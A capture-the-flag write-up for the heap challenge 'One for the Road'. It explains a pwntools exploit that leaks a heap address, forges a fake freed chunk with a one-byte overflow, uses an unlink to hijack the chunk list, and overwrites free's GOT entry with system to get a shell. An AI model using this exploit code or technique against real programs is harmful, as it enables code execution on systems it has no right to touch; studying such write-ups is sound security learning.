# One for the Road

## Solution

This is a heap problem that gives four operations: allocate a new chunk, edit the content of a chunk (with a one byte overflow), view the content of a chunk, and free a chunk. We note that if we try to view a chunk that does not exist, the address of the heap is leaked. So, we use this fact to leak of the address of the heap, which is where the list of addresses to chunks are stored.
```python
def leak_heap():
    log.info("Leaking heap...")
    p.sendlineafter(b'choice', b'3')
    p.sendlineafter(b'):', b'21')
    p.recvuntil(b'at 0x')
    leak_str = p.recvline()[:-1]
    leak = int(leak_str, 16)
    log.info(f"Heap leak: {hex(leak)}")
    return leak
```
Now, we allocate five chunks and turn the fourth one into a fake freed chunk where we use the one byte overwrite to trick the the next chunk into thinking the previous chunk is freed.
```python
def create_fake_chunk(heap_addr):
    log.info(f"Creating fake chunk...")
    payload = b'\0'*8
    payload += p64(0x91)
    payload += p64(heap_addr)
    payload += p64(heap_addr + 0x8)
    payload += b'A' * 0x70
    payload += p64(0x90)
    payload += b'\xa0'
    fill(4, payload)
```
Now, we free the fifth chunk, with consolidates with the fake freed fourth chunk. This uses the back and forward pointers that we injected to replace the fourth value in the chunk list to point to the chunk list itself. Now, when we edit the fourth chunk, we are really editing the pointer to the first chunk in the list. So, we edit this to point to `free` in the got. We then view the chunk to leak the address of free (and thus libc). Now, we set the address of `free` to be at `system`. Finally, we edit the second chunk to container `/bin/sh` and call free on it, which actually calls `system`.
```python
for _ in range(5):
    create()
heap_addr = leak_heap()
create_fake_chunk(heap_addr)
free(5)

fill(4, p64(e.got['free']))
free_leak = u64(view(1) + b'\0\0')
log.info(f"Free leak: {hex(free_leak)}")

libc.address = free_leak - libc.symbols['free']
fill(1, p64(libc.symbols['system']))
fill(2, b'/bin/sh')
free(2)

p.interactive()
```